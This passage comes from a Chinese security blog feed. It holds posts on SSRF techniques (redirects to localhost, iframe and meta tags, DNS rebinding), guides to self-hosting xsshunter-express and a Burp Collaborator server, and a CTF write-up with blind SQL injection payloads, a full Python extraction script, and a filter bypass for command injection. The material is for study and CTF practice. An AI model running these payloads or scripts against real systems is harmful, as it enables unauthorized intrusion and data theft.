class="attr">name</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">        <span class="attr">age</span>: <span class="number">28</span>,</span><br><span class="line">        <span class="attr">email</span>: <span class="string">&quot;zhangsan@example.com&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录访问日志</span></span><br><span class="line">    <span class="keyword">const</span> logMessage = &#123;</span><br><span class="line">        <span class="attr">timestamp</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toISOString</span>(),</span><br><span class="line">        <span class="attr">requestCount</span>: requestCount,</span><br><span class="line">        <span class="attr">method</span>: req.<span class="property">method</span>,</span><br><span class="line">        <span class="attr">headers</span>: req.<span class="property">headers</span>,</span><br><span class="line">        <span class="attr">query</span>: req.<span class="property">query</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;访问日志:&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(logMessage, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line">  <span class="comment">//请求的次数</span></span><br><span class="line">    <span class="keyword">if</span> (requestCount &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 返回状态 200 和个人信息的 JSON 数据</span></span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(personalInfo);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 第 5 次访问，返回状态 302 跳转到百度</span></span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="number">302</span>, <span class="string">&#x27;http://127.0.0.1/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`服务器正在运行，访问 http://localhost:<span class="subst">$&#123;PORT&#125;</span>/1`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>请求第1次，返回正常的个人信息内容，请求第2次，则进行302跳转，跳转到内网中。</p><p><strong>例如</strong>，后端代码验证的请求的URL只能是特定的<code>User-Agent</code>头。</p><p>使用<code>php</code>实现<code>1.php</code>，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 获取请求的 User-Agent</span></span><br><span class="line">    <span class="variable">$userAgent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">    <span class="comment">// 检查 User-Agent 是否包含 okhttp/3.12.1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$userAgent</span>, <span class="string">&#x27;okhttp/3.12.1&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: https://www.baidu.com&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>(); <span class="comment">// 确保停止脚本执行</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// 设置跳转目标URL</span></span><br><span class="line">    <span class="variable">$target_url</span> = <span class="string">&#x27;http://127.0.0.1/&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$target_url</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="内网html渲染">内网html渲染</h3><p>后端代码在处理前端传输的<code>html</code>内容时，会对输入的内容进行渲染，例如，文本转换为PDF、在线简历生成等可能存在<code>html</code>渲染的功能点。</p><h4 id="1-、使用iframe标签直接读取内网">(1)、使用iframe标签直接读取内网</h4><p>代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800&quot;</span> <span class="attr">height</span>=<span class="string">&quot;10000&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-、使用标签跳转内网">(2)、使用标签跳转内网</h4><p><code>&lt;meta&gt;</code>和<code>&lt;script&gt;</code>标签进行跳转。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0; url=http://127.0.0.1/&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;http://127.0.0.1/&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-、使用标签引入内网">(3)、使用标签引入内网</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/&quot;</span> <span class="attr">width</span>=<span class="string">&quot;600&quot;</span> <span class="attr">height</span>=<span class="string">&quot;800&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/html&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;http://127.0.0.1/&quot;</span> <span class="attr">width</span>=<span class="string">&quot;600&quot;</span> <span class="attr">height</span>=<span class="string">&quot;800&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DNS-rebinding">DNS rebinding</h3><p><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p><p>在请求时注意<code>CDN</code>缓存的问题，可以尝试修改请求的url。</p><p><a href="http://7f000001.c0a80001.rbndr.us/flag.html?11">http://7f000001.c0a80001.rbndr.us/flag.html?11</a></p><p><a href="http://7f000001.c0a80001.rbndr.us/flag.html?22">http://7f000001.c0a80001.rbndr.us/flag.html?22</a></p><p><a href="http://7f000001.c0a80001.rbndr.us/flag.html?33">http://7f000001.c0a80001.rbndr.us/flag.html?33</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> Redis </tag>
            
            <tag> gopher协议 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xsshunter-express搭建</title>
      <link href="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/"/>
      <url>/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="https://www.youtube.com/watch?v=HF05dr8xhso&amp;t=377s">https://www.youtube.com/watch?v=HF05dr8xhso&amp;t=377s</a></p><h4 id="域名配置">域名配置</h4><p>首先配置一下自己的域名，以test.com域名为例，将xsshunter-express配置到域名xss.test.com上。</p><p>***注意：***我的服务器为腾讯云的香港服务器无需备案可访问。</p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/1.png" alt></p><h4 id="开始安装">开始安装</h4><p>首先下载xsshunter-express</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mandatoryprogrammer/xsshunter-express.git</span><br><span class="line">cd xsshunter-express/</span><br></pre></td></tr></table></figure><p>安装使用的是docker环境，修改docker的配置文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure><p>修改配置，将version修改为3.3，<a href="http://xn--HOSTNAMExss-o68qo3j09bh62acno8tqo72bkx9d.test.com">将HOSTNAME修改为你的域名xss.test.com</a>。如果只是想让xsshunter-express可以使用，这样就行了，需要登陆xss.test.com看一下xss是否触发。还可以配置邮箱接收自己的xss触发提醒，这里我为了方便没有配置，想配置可以参考原视频。</p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/2.png" alt></p><p>开始安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d postgresdb</span><br><span class="line">docker-compose up xsshunterexpress</span><br></pre></td></tr></table></figure><p>安装成功，记一下密码。</p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/3.png" alt></p><h4 id="测试">测试</h4><p>访问<a href="https://xss.test.com/admin/#/%EF%BC%8C%E8%BE%93%E5%85%A5%E4%BD%A0%E7%9A%84%E5%AF%86%E7%A0%81%E5%8D%B3%E5%8F%AF%E7%99%BB%E5%BD%95%E3%80%82">https://xss.test.com/admin/#/，输入你的密码即可登录。</a></p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/4.png" alt></p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/5.png" alt></p><p>在XSS PAYLOADS模块，随意找一个payload进行测试，我是用的<code>&lt;img&gt;</code>的测试标签。</p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/6.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建Burp Collaborator</title>
      <link href="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/"/>
      <url>/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/</url>
      
        <content type="html"><![CDATA[<h2 id="要求">要求</h2><p>Docker、域名、BurpSuite、服务器Ubuntu 20（尽量选择香港服务器，域名不需要备案可访问）</p><h2 id="设置域名">设置域名</h2><p>去到自己的域名的DNS管理器。设置一个burp collaborator子域名，并将NS记录添加到你的burp collaborator子域名，一个A记录指向你的服务器，如下图所示。</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/1.png" alt></p><p>NS记录的域名为你使用的BurpSuite Collaborator域名。</p><h2 id="环境设置">环境设置</h2><p>如果没有docker需要安装docker。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt upgrade -y </span><br><span class="line"><span class="built_in">sudo</span> apt install docker.io</span><br></pre></td></tr></table></figure><p>安装docker以后，继续</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/integrity-sa/burpcollaborator-docker.git &amp;&amp; cd burpcollaborator-docker</span><br></pre></td></tr></table></figure><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/2.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">&quot;https://portswigger.net/burp/releases/download?product=pro&amp;version=2021.10.3&amp;type=Jar&quot;</span></span><br><span class="line"><span class="built_in">mv</span> <span class="string">&#x27;download?product=pro&amp;version=2021.10.3&amp;type=Jar&#x27;</span> burp.jar &amp;&amp; <span class="built_in">mv</span> burp.jar ./burp/pkg/burp.jar</span><br></pre></td></tr></table></figure><p>确保将域名和IP替换为响应的域名和服务器IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./init.sh burp.hackplaza.net 20.119.42.229</span><br></pre></td></tr></table></figure><p>如果你遇到这样的错误。</p><p>Error starting userland proxy: listen tcp4 0.0.0.0:53: bind: address already in use.</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/3.png" alt></p><p>使用下面的命令解决。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl stop systemd-resolved</span><br></pre></td></tr></table></figure><h2 id="入站规则">入站规则</h2><p>如果你再次遇到这样的错误。</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/4.png" alt></p><p>你必须在网络组中进行一些更改才能允许入站链接。你必须相应地在VPS提供商中执行此操作。我正在使用Azure，所以这是如何做到的。</p><p>Click on VM &gt; Networking &gt; Add inbound port rule &gt; In Destination Port ranges keep * in it and finally click on Add</p><p>单击“VM”&gt;“网络&gt;”添加入站端口规则“&gt;”在目标端口范围中保留 *“，最后单击”添加”</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/5.png" alt></p><p>再次运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./init.sh burp.hackplaza.net 20.119.42.229</span><br></pre></td></tr></table></figure><p>将域名和服务器IP替换为你自己的IP。</p><p>成功完整的安装输出将如下所示：</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/6.png" alt></p><h2 id="使用BurpSuite-Pro进行测试">使用BurpSuite Pro进行测试</h2><p>打开您的 Burp Suite Professional</p><p>Click on Project Options Tab &gt; Misc &gt; Burp Collaborator Server<br>单击“项目选项”选项卡 &gt; “杂项”&gt; Burp Collaborator Server</p><p>Select use private collaborator and do like shown in picture and click on Run Health check</p><p>选择使用private collaborator，并如图所示，然后单击运行运行状况检查</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/7.png" alt></p><p>现在，您可以从BurpSuite Pro正常使用您的private Burp Collaborator服务器。</p><p>上述为原文的翻译部分，下面为自己安装时遇到的问题。</p><h2 id="配置问题">配置问题</h2><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/8.png" alt></p><h2 id="证书问题">证书问题</h2><p>certbot默认生成证书使用的是EC算法，处理证书使用的是处理RSA证书的代码，所以需要修改证书为RSA证书。</p><p>/burpcollaborator-docker/certbot/new.sh</p><p>这个是生成证书的文件，在末尾加上<code>--key-type rsa</code>即可。</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/9.png" alt></p><p>Burpsuite Collaborator配置</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/10.png" alt></p><h2 id="其他问题">其他问题</h2><p><code>docker logs burp</code>查看burp报错的原因，找问题所在。</p><h2 id="参考">参考</h2><p><a href="https://hackplaza.net/2021/12/17/how-to-setup-private-burp-collaborator/">https://hackplaza.net/2021/12/17/how-to-setup-private-burp-collaborator/</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BurpSuite </tag>
            
            <tag> dnslog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF做题记录</title>
      <link href="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="NewStarCTF-2023-web-week3-midsql-sql">[NewStarCTF 2023] web week3 midsql_sql</h3><p>通过布尔判断存在sql注入。</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_1.png" alt></p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_2.png" alt></p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_3.png" alt></p><p>数据库名为：<code>ctf</code>，<code>left('abcde',3)='abc'</code>从字符串的左边开始截取3个字符。</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_4.png" alt></p><p>经过测试发现，无法进行union注入，select等敏感函数被过滤，可通过大小写绕过。</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/no_union.png" alt></p><p>关键函数<code>group_concat(table_name)</code>，将分组中的值连接组合，即这里将表名连接组合。通过此函数得到表名、列名。</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_5.png" alt></p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_6.png" alt></p><p>利用到的payload如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &amp;&amp; 1-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="operator">&amp;&amp;</span> <span class="number">0</span><span class="comment">-- -</span></span><br><span class="line"><span class="string">&#x27; &amp;&amp; if((length(database())=3),1,0)-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="operator">&amp;&amp;</span> <span class="keyword">left</span>(database(),<span class="number">3</span>)<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span><span class="comment">-- -</span></span><br><span class="line"><span class="string">&#x27; &amp;&amp; if(Ascii(Substr((Select Group_concat(table_name) From infOrmation_schema.tables Where Table_schema=&#x27;</span>ctf<span class="string">&#x27;),1,1))=t,1,0)-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="operator">&amp;&amp;</span> if(Ascii(Substr((<span class="keyword">Select</span> Group_concat(column_name) <span class="keyword">From</span> infOrmation_schema.columns <span class="keyword">Where</span> Table_name<span class="operator">=</span><span class="string">&#x27;here_is_flag&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span>t,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p>通过上述的获取表名和列名的sql语句，通过字符的<strong>ASCII</strong>和<strong>t</strong>比较大小，可以利用二分法快速输出数据库名、表名、列名等信息。</p><p>个人感觉比较好用的poc如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;http://8bbb955c-7d10-474e-8234-4da0fb1ae4d9.node5.buuoj.cn:81/?id=TMP0919&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DBname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--库名</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#根据数据包的特征判断</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据库名为：&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TBname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--表名</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr((Select Group_concat(table_name) From infOrmation_schema.tables Where Table_schema=&#x27;ctf&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据表名为：&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CLname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--列名</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr((Select Group_concat(column_name) From infOrmation_schema.columns Where Table_name=&#x27;here_is_flag&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据列名为：&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Valname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--报数据</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr((Select Group_concat(flag) From here_is_flag),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据为：&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line">DBname()</span><br><span class="line">TBname()</span><br><span class="line">CLname()</span><br><span class="line">Valname()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可得到flag</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/flag.png" alt></p><p>参考</p><ul><li><a href="https://blog.csdn.net/m0_73512445/article/details/133694293">[NewStarCTF 2023] web题解</a></li></ul><h3 id="NewStarCTF-公开赛赛道-So-Baby-RCE">[NewStarCTF 公开赛赛道]So Baby RCE</h3><p>题目如下：</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce_1.png" alt></p><p>发现代码中没有过滤<code>ls</code></p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce_2.png" alt></p><p>当前目录下什么东西，尝试跨目录读取文件，<code>cd </code>未过滤，<code>&amp;</code>未过滤，<code>cat</code>被过滤，通过添加特殊字符绕过<code>ca$@t</code>。记住$@特殊字符的使用，很多情况下可以绕过。</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce_3.png" alt></p><p>Payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 